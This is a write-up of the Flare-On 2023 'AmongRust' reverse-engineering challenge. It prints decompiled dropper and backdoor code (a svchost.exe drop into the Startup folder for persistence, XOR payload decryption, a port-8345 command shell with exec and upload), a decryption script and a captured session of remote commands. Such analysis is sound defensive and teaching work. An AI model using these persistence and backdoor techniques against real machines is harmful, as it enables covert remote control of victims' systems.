## Flare-On 2023 - #8 AmongRust
___

### Description: 

*Our customer recently found the following malware executing on one of their machines.*
*The system was left with a very silly looking wallpaper, and a lot of executables on the machine*
*had stopped working. The customer had successfully restored from backup, but we are still*
*interested in understanding all capabilities of the malware. A packet capture file has been*
*provided to aid your analysis.*

`7-zip password: flare`
___

### Solution:

In this challenge we are given a Rust binary, which is basically a dropper. Function
`u_decrypt_payload` at `0x140006780` loads **2** executables from the resources and decrypts them.
Everythign starts from `void (__fastcall **u_real_main())(__int64)` at `0x140003BC0`:
```c
char u_real_main() {
  /* ... */
  v0 = u_drop_svchost_exe();
  if ( v0 ) {
    v27 = v0;
    v28 = (char *)v1;
    (*v1)(v0);
    v2 = *((_QWORD *)v28 + 1);
    if ( v2 )
      j___rdl_dealloc(v27, v2, *((_QWORD *)v28 + 2));
  }
  ppszPath[0] = 0i64;
  // C:\users\ispo
  if ( SHGetKnownFolderPath(&rfid, 0, 0i64, ppszPath) ) {
    v4 = u_throw_ex("Can't retrieve known foldersrc\\util.rs", 27i64, v3);
    /* ... */    
  } else {
    v10 = -1i64;
    while ( ppszPath[0][++v10] != 0 )
      ;
    u_alloc_ANSI_str((__int64)&v22, ppszPath[0], v10);
    v9 = *((_QWORD *)&v22 + 1);
    if ( !*((_QWORD *)&v22 + 1) )
      core::result::unwrap_failed::hd18e5b485cc9c5ed(
        (__int64)"called `Result::unwrap()` on an `Err` value",
        43i64,
        (__int64)v29,
        (__int64)&off_14003BBE0,
        (__int64)&off_1400B2C48);
    result = v22;
    v12 = (__int64)v23;
    v25 = v22;
    v26 = v23;
    if ( v23 )  {     
      /* ... */
      if ( v16 ) {
        *(_QWORD *)&v22 = v17;
        *((PWSTR *)&v22 + 1) = ppszPath[0];
        v23 = v14;
        v24 = v15;
        core::result::unwrap_failed::hd18e5b485cc9c5ed(
          (__int64)"called `Result::unwrap()` on an `Err` value",
          43i64,
          (__int64)&v22,
          (__int64)&off_14003B780,
          (__int64)&glo_src_main_rs_ptr);
      }
      v23 = (PWSTR)v21;
      v22 = *(_OWORD *)ppszPath;
      v30 = 0;
      users_ispo_wildcard = sub_140031860((__int64)&v22, v17, v13);
      v31 = 0;
      return u_REVERSE_ME((__int64)users_ispo_wildcard, v19);
    }
    /* ... */
}
```

The most important function is `u_drop_svchost_exe` that decrypts a global buffer `glo_packed_exe`
located at `0x14003BC00` of size `175104` and writes it on `svchost.exe`:
```c
char *u_drop_svchost_exe() {
  /* ... */
  // C:\users\ispo\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\StartUp
  if ( SHGetKnownFolderPath(&stru_1400B2C60, 0, 0i64, (PWSTR *)&v17[15]) )
    return u_throw_ex("Can't retrieve known foldersrc\\util.rs", 27i64, v0);
  len = -1i64;
  while ( ppszPath[++len] != 0 )
    ;
  u_alloc_ANSI_str((__int64)&path, ppszPath, len);
  str = path.str;
  if ( !path.str )
    core::result::unwrap_failed::hd18e5b485cc9c5ed(
      (__int64)"called `Result::unwrap()` on an `Err` value",
      43i64,
      (__int64)v24,
      (__int64)&off_14003BBE0,
      (__int64)&off_1400B2C48);
  len2 = path.len2;
  path_ = path;
  if ( path.len - path.len2 <= 0xBui64 )
  {
    alloc::raw_vec::impl_1::reserve::do_reserve_and_handle_u8_alloc::alloc::Global_(&path_.len, path.len2, 12i64);
    str = path_.str;
    len2 = path_.len2;
  }
  qmemcpy((void *)(str + len2), "\\svchost.exe", 12);
  path_.len2 = len2 + 12;
  u_open_file_maybe((__int64)&path, (__int64)"C:\\Windows\\System32\\svchost.exe", 31i64);
  if ( LODWORD(path.len) == 2 ) {
    if ( (path.str & 3) == 1 ) {
      v21 = (_QWORD *)(path.str - 1);
      v7 = *(_QWORD *)(path.str - 1);
      v22 = path.str;
      (**(void (__fastcall ***)(__int64))(path.str + 7))(v7);
      v8 = *(_QWORD *)(v22 + 7);
      v9 = *(_QWORD *)(v8 + 8);
      v10 = v21;
      if ( v9 )
        j___rdl_dealloc(*v21, v9, *(_QWORD *)(v8 + 16));
      j___rdl_dealloc(v10, 24i64, 8i64);
    }
    v1 = u_throw_ex(&unk_1400B2C00, 33i64, v6);
    v11 = path_.len;
    if ( !path_.len )
      return v1;
LABEL_23:
    j___rdl_dealloc(path_.str, v11, v11 >= 0);
    return v1;
  }
  /* ... */
  v15 = u_decrypt_payload((char *)path_.str, path_.len2, glo_packed_exe, 175104i64);
  /* ... */
  if ( path_.len )
    j___rdl_dealloc(path_.str, path_.len, path_.len >= 0);
  return 0i64;
}
```

The decryption is fairly simple:
```c
__int64 __fastcall u_decrypt_payload(char *a1_path, __int64 a2_pathlen, _BYTE *a3_buf, __int64 a4_buflen) {
  /* ... */
  *(_QWORD *)v7 = 'rretePc@';                   // key
  /* ... */
  memcpy((void *)key, str, keylen);
  if ( v58.len )
    j___rdl_dealloc(str, v58.len, v58.len >= 0);
  v15 = &a3_buf[a4_buflen];
  for ( i = 0i64; a3_buf != v15; i = (unsigned int)v32 % (unsigned int)keylen ) {
    while ( 1 ) {
      if ( i >= keylen )
        core::panicking::panic_bounds_check::h71ab97ce31446728(i, keylen);
      v33 = *a3_buf ^ *(_BYTE *)(key + i);
      v34 = v57;
      if ( v57 == v55 )
      {
        alloc::raw_vec::RawVec::reserve_for_push_u8_alloc::alloc::Global_(&v55);
        v34 = v57;
      }
      ++a3_buf;
      *(_BYTE *)(v56 + v34) = v33;
      ++v57;
      v32 = i + 1;
      if ( !((keylen | v32) >> 32) )
        break;
      i = v32 % keylen;
      if ( a3_buf == v15 )
        goto LABEL_10;
    }
  }
  /* ... */
}
```

This is a [Vigenère cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher), with a decryption
key `@cPeterr`.

If we go back to `main` there's another interesting function at `0x140007E30`:
```c
char __fastcall u_REVERSE_ME(__int64 a1, __int64 a2) {
  /* ... */
  if ( v54 ) {
    v31 = sub_140003920(&v56, 0i64, v54);
    v32 = 0i64;
    while ( 1 ) {
      while ( 1 ) {
        if ( v32 >= v30 ) {
          v29 = (_QWORD *)v56;
          goto LABEL_47;
        }
        v33 = v32 + 1;
        v34 = v53 + 24 * v32;
        v35 = *(_QWORD *)(v34 + 8);
        v36 = *(_QWORD *)(v34 + 16);
        if ( v32 == v31 )
          break;
        v37 = u_decrypt_payload(v35, v36, glo_packed_exe, 175104i64);
        if ( v37 ) {
          ++v32;
          if ( (v37 & 3) == 1 )
            goto LABEL_34;
        } else {
          _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::heb9ee2875b07a706(
            (signed __int64 *)v55,
            v34,
            v39);
          ++dword_1400C3130;
          if ( *(_QWORD *)&v55[0] )
            j___rdl_dealloc(*((_QWORD *)&v55[0] + 1), *(_QWORD *)&v55[0], *(_QWORD *)&v55[0] >= 0i64);
          ++v32;
        }
      }
      v37 = u_decrypt_payload(v35, v36, glo_packed_exe_2, 312320i64);
      if ( v37 ) {
       /* ... */
      }
  /* ... */
  return 1;
}
```

The only thing we care about here are the calls to the `u_decrypt_payload`. That is we have a
second binary that is being decrypted. Since we know the key, we can easily decrypt those
executables:
```python
open('payload_1.exe', 'wb').write(
    bytearray(b ^ b'@cPeterr'[i % 8] for i, b in enumerate(
        open('payload_1.bin', 'rb').read())
    )
)

open('payload_2.exe', 'wb').write(
    bytearray(b ^ b'@cPeterr'[i % 8] for i, b in enumerate(
        open('payload_2.bin', 'rb').read())
    )
)
```

`payload_1.exe` does not do much (`main` is at `0x140001040`):
```c
__int64 u_real_main() {
  __int64 v1[6]; // [rsp+28h] [rbp-30h] BYREF

  v1[2] = (__int64)&off_14001E3B0;
  v1[3] = 1i64;
  v1[0] = 0i64;
  v1[4] = (__int64)"Flare-On flag: https://bit.ly/flare-on-flag\n";
  v1[5] = 0i64;
  return sub_140005800(v1);
}
```


`payload_2.exe` is more interesting. `main` starts from `0x1400047B0` where it starts a server
at `0.0.0.0:8345`:
```c
int u_real_main() {
  return u_internal_main();
}
```

```c
int u_internal_main() {
  /* ... */
  v14[1] = (volatile signed __int64 *)-2i64;
  u_bind_server(&v5 + 11, (__int64)"0.0.0.0:8345", 12i64);// 12 = strlen("0.0.0.0:8345")
  if ( hObject ) {
    hObject = (HANDLE)v13;
    core::result::unwrap_failed::hd18e5b485cc9c5ed(
      (unsigned int)"Could not bind",
      14,
      (unsigned int)&hObject,
      (unsigned int)&off_140038578,
      (__int64)&off_1400387D8);
  }
  sock = (SOCKET)v13;
  a1 = u_get_a1((__int64)&sock);
  // accept connection
  while ( 1 ) {
    _$LT$std..net..tcp..Incoming$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::hab15362c250fc1a6(
      &v6,
      &a1);
    if ( v6 == 2 )
      break;
    if ( v6 ) {
      if ( (a2 & 3) == 1 ) {
        // teardown
        /* ... */
      }
    } else {
      u_handle_incoming_connection(&hObject, a2);
      CloseHandle(hObject);
      if ( !_InterlockedDecrement64(v13) )
        sub_140007510((__int64 *)&v13);
      if ( !_InterlockedDecrement64(v14[0]) )
        sub_1400075C0(v14);
    }
  }
  return closesocket(sock);
}
```

We connect to the server using netcat:
```
ispo@ispo-glaptop2:~/ctf/flare-on-challenges/flare-on-2023/08_AmongRust$ nc 0.0.0.0 8345 -vv
Connection to 0.0.0.0 8345 port [tcp/*] succeeded!
123
Invalid key size
```

We can now use the `Invalid key size` to locate the thread routine that handles the incoming
connection, which is located at `0x140001490`:
```c
__int64 __fastcall u_backdoor_routine(SOCKET a1_sock) {
  /* ... */  
  v196 = -2i64;
  sock = a1_sock;
  memset(rbuf, 0, sizeof(rbuf));
  v195 = 0;
  u_recv(wtf, &sock, &rbuf[32], 0x20ui64);
  bytes_recv = wtf[0].nrecv;
  if ( !wtf[0].zero ) {
    if ( wtf[0].nrecv != 32 ) {                  // need to read 32 bytes!
      v2 = j___rdl_alloc(0x10ui64, 1ui64);
      if ( !v2 ) {
        v195 = 0;
        u_alloc_error_oom();
      }
      v3 = (__int64)v2;
      *(_OWORD *)v2 = *(_OWORD *)"Invalid key size";
      v182 = (__int64)v2;
      v181 = 16i64;
      v195 = 1;
      std::net::udp::UdpSocket::send::hc00b4ab8362b1a2d(wtf, &sock, v2, 16i64);
      bytes_recv = wtf[0].zero;
      if ( wtf[0].zero )
        bytes_recv = wtf[0].nrecv;
      v4 = 16i64;
      goto TEARDOWN;
    }
    v5 = j___rdl_alloc(6ui64, 1ui64);
    if ( !v5 ) {
      v195 = 0;
      u_alloc_error_oom();
    }
    v6 = (__int64)v5;                           // send 'ACK_K\r' back
    *((_WORD *)v5 + 2) = '\rK';
    *(_DWORD *)v5 = '_KCA';
    v182 = (__int64)v5;
    v181 = 6i64;
    v195 = 1;
    v4 = 6i64;
    std::net::udp::UdpSocket::send::hc00b4ab8362b1a2d(wtf, &sock, v5, 6i64);
    if ( wtf[0].zero ) {
      bytes_recv = wtf[0].nrecv;
      v3 = v6;
    } else {
      v182 = v6;
      v181 = 6i64;
      v195 = 1;
      u_recv(wtf, &sock, rbuf, 0x20ui64);
      bytes_recv = wtf[0].nrecv;
      if ( !wtf[0].zero ) {
        if ( wtf[0].nrecv != 32 ) {
          v7 = j___rdl_alloc(0x12ui64, 1ui64);
          if ( !v7 )
          {
            v182 = v6;
            v181 = 6i64;
            v195 = 1;
            u_alloc_error_oom();
          }
          v3 = (__int64)v7;
          qmemcpy(v7, "Invalid nonce size", 18);
          j___rdl_dealloc(v6, 6i64, 1i64);
          v182 = v3;
          v181 = 18i64;
          v195 = 1;
          std::net::udp::UdpSocket::send::hc00b4ab8362b1a2d(wtf, &sock, v3, 18i64);
          bytes_recv = wtf[0].zero;
          if ( wtf[0].zero )
            bytes_recv = wtf[0].nrecv;
          v4 = 18i64;
          goto TEARDOWN;
        }
        v8 = j___rdl_alloc(6ui64, 1ui64);
        if ( !v8 ) {
          v182 = v6;
          v181 = 6i64;
          v195 = 1;
          u_alloc_error_oom();
        }
        v3 = (__int64)v8;
        *((_WORD *)v8 + 2) = '\rN';
        *(_DWORD *)v8 = '_KCA';
        v4 = 6i64;
        j___rdl_dealloc(v6, 6i64, 1i64);
        v182 = v3;
        v181 = 6i64;
        v195 = 1;
        std::net::udp::UdpSocket::send::hc00b4ab8362b1a2d(wtf, &sock, v3, 6i64);
        if ( wtf[0].zero ) {
          bytes_recv = wtf[0].nrecv;
          goto TEARDOWN;
        }
```

Initially, the server waits for a **32** byte `key`. If it receives it correctly it returns the
message `ACK_K\n`. The it waits for a **32** byte `nonce`. If it receives it correctly it returns the
message `ACK_N\n`. Then it enters a backdoor loop where it waits for commands:
```c
        v183 = v3;
        while ( 1 ) {
LABEL_23:
          memset(bigbuf, 0, sizeof(bigbuf));
          v182 = v3;
          v181 = 6i64;
          v195 = 1;
          u_recv(wtf, &sock, bigbuf, 0x200ui64);
          bytes_recv = wtf[0].nrecv;
          if ( wtf[0].zero )
            goto TEARDOWN;
          if ( !wtf[0].nrecv ) {
            bytes_recv = 0i64;
            goto TEARDOWN;
          }
          buf_0x200_ = j___rdl_alloc(0x200ui64, 1ui64);
          /* ... */
          if ( *(__int64 *)((char *)&a1[1].zero + 7) < 4ui64 ) {
INVALID_BACKDOOR_CMD:
            std::net::udp::UdpSocket::send::hc00b4ab8362b1a2d(
              wtf,
              &sock,
              "Invalid backdoor command\r\n",
              26i64);
            v3 = v183;
            if ( !wtf[0].zero )
              goto LABEL_37;
            bytes_recv = wtf[0].nrecv;
            goto TEARDOWN_2;
          }
          if ( *(_DWORD *)cmd.str == 'tixe' ) {  // exit command
            bytes_recv = 0i64;
            goto TEARDOWN_2;
          }
          if ( *(__int64 *)((char *)&a1[1].zero + 7) < 5ui64 )
            goto INVALID_BACKDOOR_CMD;
          if ( !(*(_DWORD *)cmd.str ^ 'cexe' | *(unsigned __int8 *)(cmd.str + 4) ^ ' ') )// 'exec ' command
            break;
          if ( *(__int64 *)((char *)&a1[1].zero + 7) < 7ui64
            || *(_DWORD *)cmd.str ^ 'olpu' | *(_DWORD *)(cmd.str + 3) ^ ' dao' ) {// 'upload ' command
            goto INVALID_BACKDOOR_CMD;
          }
          // UPLOAD COMMAND
          ((void (__fastcall *)(__int64 *, string *))_$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::heb9ee2875b07a706)(
            &v153,
            &cmd);
          v81 = (__int64)v154;
          /* ... */            
          while ( 1 ) {
            filename__ = filename_;
            LOBYTE(v97) = 13;
            // drop newline
            v99 = core::slice::memchr::memrchr::h10b503721daa6ef5(v97, filename_, v98);
            filename_ = v184;
            if ( v99 != 1 ) {
              filename__ = v184;
              sub_140037680("Can't find response end", 23i64, &off_1400387A0);
            }
            /* ... */
          }
          /* ... */           
            for ( i = 1i64; ; v178 = i )
            {
              v111 = sub_140005CC0(wtf);        // locate size
              if ( !v111 )
                break;
              /* ... */  
            }
            /* ... */  
            if ( i == 2 ) {
              filename_with_size = *(_QWORD *)v177;
              filename_len = *((_QWORD *)v177 + 1);
              v120 = *((_QWORD *)v177 + 2);
              v121 = *((_QWORD *)v177 + 3);
              v193 = v177;
              v189 = v177;
              v192 = v176;
              v188 = v176;
              core::num::_$LT$impl$u20$core..str..traits..FromStr$u20$for$u20$u64$GT$::from_str::ha56ff37db3327a0d(
                wtf,
                v120,
                v121);
              if ( LOBYTE(wtf[0].zero) ) {
                LOBYTE(a1[0].zero) = BYTE1(wtf[0].zero);
                v189 = v193;
                v188 = v192;
                core::result::unwrap_failed::hd18e5b485cc9c5ed(
                  (unsigned int)"Not a valid size",
                  16,
                  (unsigned int)a1,
                  (unsigned int)&off_140038558,
                  (__int64)&off_140038768);
              }
              nrecv = wtf[0].nrecv;
              v189 = v193;
              v188 = v192;
              std::net::udp::UdpSocket::send::hc00b4ab8362b1a2d(wtf, &sock, "ACK_UPLOAD\r", 11i64);
              if ( wtf[0].zero )
                goto LABEL_279;
              /* ... */  
              bytes_recv = sub_14001C3F0(filename_with_size, filename_len);
              if ( !bytes_recv ) {
                /* ... */                 
                if ( !v133 ) {
                  hObject[0] = v134;
                  memset(wtf, 0, sizeof(wtf));  // read the whole file
                  if ( !nrecv )
                    goto LABEL_250;
                  do {
                    if ( nrecv < 0x200 ) {
                      u_recv(a1, &sock, (char *)wtf, nrecv);
                      bytes_recv = a1[0].nrecv;
                      if ( a1[0].zero )
                        goto LABEL_278;
                      sub_14001CB10(a1, hObject, wtf, nrecv);
                      if ( a1[0].zero ) {
                        bytes_recv = a1[0].nrecv;
                        goto LABEL_278;
                      }
                    } else {
                      u_recv(a1, &sock, (char *)wtf, 0x200ui64);
                      bytes_recv = a1[0].nrecv;
                      if ( a1[0].zero )
                        goto LABEL_278;
                      sub_14001CB10(a1, hObject, wtf, 512i64);
                      if ( a1[0].zero )
                        goto LABEL_276;
                    }
                    v135 = sub_1400103B0(hObject);
                    if ( v135 ) {
                      bytes_recv = v135;
LABEL_278:
                      v189 = v193;
                      v188 = v192;
                      CloseHandle(hObject[0]);
                      goto LABEL_280;
                    }
                    nrecv -= bytes_recv;
                  }
                  while ( nrecv );
                  bytes_recv = (__int64)hObject[0];
LABEL_250:
                  v189 = v193;
                  v188 = v192;
                  CloseHandle((HANDLE)bytes_recv);
                  v189 = v193;
                  v188 = v192;
                  bytes_recv = u_decrypt_file(filename_with_size, filename_len, (int)&rbuf[32], 32, rbuf, 0x20ui64);
                  if ( !bytes_recv )
                  {
                    v189 = v193;
                    v188 = v192;
                    std::net::udp::UdpSocket::send::hc00b4ab8362b1a2d(wtf, &sock, "ACK_UPLOAD_FIN\r", 15i64);
                    if ( !wtf[0].zero )
                    {
                      if ( v192 )
                        j___rdl_dealloc(v193, 16 * v192, 8i64);
                      if ( v82 )
                        j___rdl_dealloc(v184, v82, (v82 & 0x8000000000000000ui64) == 0i64);
                      v3 = v183;
                      v4 = 6i64;
                      goto LABEL_37;
                    }
LABEL_279:
                    bytes_recv = wtf[0].nrecv;
                  }
                }
              }
LABEL_280:
              if ( v192 )
                j___rdl_dealloc(v193, 16 * v192, 8i64);
              if ( v82 ) {
                v139 = (v82 & 0x8000000000000000ui64) == 0i64;
                v138 = (__int64)v184;
                v137 = v82;
LABEL_284:
                j___rdl_dealloc(v138, v137, v139);
              }
              goto LABEL_285;
            }
          } else {
            v117 = 8i64;
            v116 = 0i64;
          }
          v193 = (char *)v117;
          v189 = (char *)v117;
          v192 = v116;
          v188 = v116;
          std::net::udp::UdpSocket::send::hc00b4ab8362b1a2d(
            wtf,
            &sock,
            "Invalid backdoor command\r\n",
            26i64);
            /* ... */  
  }
  closesocket(sock);
  return bytes_recv;
}
```

The code is a little bit of a mess but you can get an idea what it does from the comments.
Function has an `exec $cmd` command where it uses executes `$cmd` as a shell command. It also
has an `upload $filepath $size` command that receives a file of size `$size` and saves it under
`$filepath`. The file is encrypted, so program decrypts it using the `key` and the `nonce`.
Finally there is an `exit` command that terminates the backdoor.

Decryption takes place inside `u_decrypt_file` at `0x140004CD0`, where we have a stream cipher:
```c
__int64 __fastcall u_decrypt_file(
        char *a1_filename,
        __int64 a2_filenamelen,
        const void *a3_key,
        SIZE_T a4_keylen,
        void *a5_nonce,
        size_t a6_noncelen) {
  /* ... */
  if ( v62 ) {
    v29 = v44[1024];
    v30 = 0i64;
    do {
      if ( !v29 ) {
        HIDWORD(v44[1025]) = sub_140004B50(v44);
        v29 = v44[1024];
      }
      if ( v29 >= 4 )
        core::panicking::panic_bounds_check::h71ab97ce31446728(v29, 4i64, &off_140038B00, v27);
      v31 = *(&v44[1025] + v29 + 4);
      v29 = (v29 + 1) & 3;
      v44[1024] = v29;
      if ( v30 >= v62 )
        core::panicking::panic_bounds_check::h71ab97ce31446728(v30, v62, &off_140038B18, v27);
      *(v61 + v30++) ^= v31;
    } while ( v28 != v30 );
  }
  /* ... */
  return 0i64;
}
```

We do not care about the actual encryption **as long as it is a symmetric encryption**, as there
is an easier way to decrypt the files.


#### Analyzing the Network Traffic
 
Now let's look at the `06_27_2023_capture.pcapng` file. Since we know that backdoor listens on
port `8345`, we set a pcap filter `tcp.port == 8345`. The first packet sends **32** bytes:
```
0030                     65 74 21 2c 9b 4d 93 34 d8 93
0040   be c2 47 7c b8 6a 70 98 3b 3c 33 95 2d 68 a8 cc
0050   5c 02 26 07 0a bf
```

And the server responds with `ACK_K\n` (ack key). Then it sends another **32** bytes:
```
0030                     0e 02 f4 a9 a8 b5 be ea ba 83
0040   48 d6 d2 f8 7c 60 68 49 df 9a 5e ef 49 a6 5c 98
0050   cf 07 d4 c2 38 a6
```

And the server responds with `ACK_N\n` (ack nonce). Then client starts sending commands
(e.g., `exec whoami`). To better see this, we select the `Follow TCP Stream` option:
```
et!,.M.4....G|.jp.;<3.-h..\.&.
.ACK_K
..........H...|`hI..^.I.\.....8.ACK_N
exec whoami
desktop-1cmr3ql\user

exec mkdir C:\Users\user\AmongRust

upload C:\Users\user\AmongRust\wallpaper.PNG 122218
ACK_UPLOAD
..........X.&....   N.......W.....u.u+.H.....Z]
..4&..U..e....j .R..,.5..|..
..."m..;.N1xD...EX..s.;.|z

[.....TRUNCATED FOR BREVITY .....]

.gS...+......!.I9.!.....C.'...-.....
.6>...)o.J.x
..]10!W.k8....G.l... .:....G,yW..&.#..AA,...Z_..[.t...hx..{..Gd......@.]...........
..t.;An..?ii..)....Mre.....L7!.......!....p^K..3......RmG......'...
..\.J...RC ...]a2.O..U.(..........L.
.l..$.k.a..S7).....H..|.jhMr......\.....LwH...F....W.......2......A.i...7...hG.hU.;...
*.=GP.....@..O.[^ |:N.s.@<Ro.a...........8[A....e..u.b..........;..~ACK_UPLOAD_FIN
upload C:\Users\user\AmongRust\wallpaper.ps1 708
ACK_UPLOAD
m1.|.............`$......Cp...6JK.Ux.H..=.../...Q..!l..
.\.d}e.7.=Q.......-...P..."."..}...F..pTo.)......&r....asf9;.?Y`.:..J..g.....+...a.|.:....@
~3H......->2..'&...>|Yx.....l"..KD..'m.9<:.dQ...X.Rl....?....{U..RY.q}.q...Y
(...e.f........~.....y.........C\8....L'.:n*>...a...j.SL.ch...74.hD.B&.6....c.\./L....K..k......PE.-+....!.0J...T.....7.j.F.P\AS.V.-d.;...(.Pah.
........w...j?V..5..N.....8....]7.......).6>9p.."..).....*.7....m........$.=
....l.>..
..#...O..B9/....,..:BZ..i.p......J.T.M...f.K.p?.a......Qr.o.........A7..v`..7.~.Q}...<5...t..=
.c.....i.#...v. s.?...m].h!.)|./"........*./.^....I_(.[...H....S.T  .7.IfzZ.%...#yf...:dj.....s..E.......R.m............n...=qD%...F.7.:f.....=....+gm....0.NACK_UPLOAD_FIN
exec powershell C:\Users\user\AmongRust\wallpaper.ps1

exec del C:\Users\user\AmongRust\wallpaper.ps1 /q

exec del C:\Users\user\AmongRust\wallpaper.PNG /q

exec rmdir C:\Users\user\AmongRust

exit
```

#### Decrypting the Files

Since, we have the `key`, the `nonce`, the encrypted files (`wallpaper.PNG` and `wallpaper.ps1`)
and the commands:
```
upload C:\Users\user\AmongRust\wallpaper.ps1 708
upload C:\Users\user\AmongRust\wallpaper.PNG 122218
```

We can write run `payload_2.exe` (the backdoor) and have a python script to send the encrypted
data, and wait for the program to decrypt them for us. That is, we do not have to analyze the
decryption algorithm. After we run the script we can get the
decrypted files. The contents of the `wallpaper.PNG` are:

![alt text](wallpaper.PNG "")

The contents of the `wallpaper.ps1` are:
```ps
Add-Type -TypeDefinition @'
using System.Runtime.InteropServices;
public class Wallpaper {
    public const uint SPI_SETDESKWALLPAPER = 0x0014;
    public const uint SPIF_UPDATEINIFILE = 0x01;
    public const uint SPIF_SENDWININICHANGE = 0x02;
    [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    private static extern int SystemParametersInfo (uint uAction, uint uParam, string lpvParam, uint fuWinIni);
    public static void SetWallpaper (string path) {
        SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, path, SPIF_UPDATEINIFILE | SPIF_SENDWININICHANGE);
    }
}
'@


$wallpaper = 'C:\Users\user\AmongRust\wallpaper.PNG'
[Wallpaper]::SetWallpaper($wallpaper)
```

For more details, please refer to the [amongrust_crack.py](./amongrust_crack.py) script.

So the flag is: `n0T_SuS_4t_aLl@flare-on.com`
___
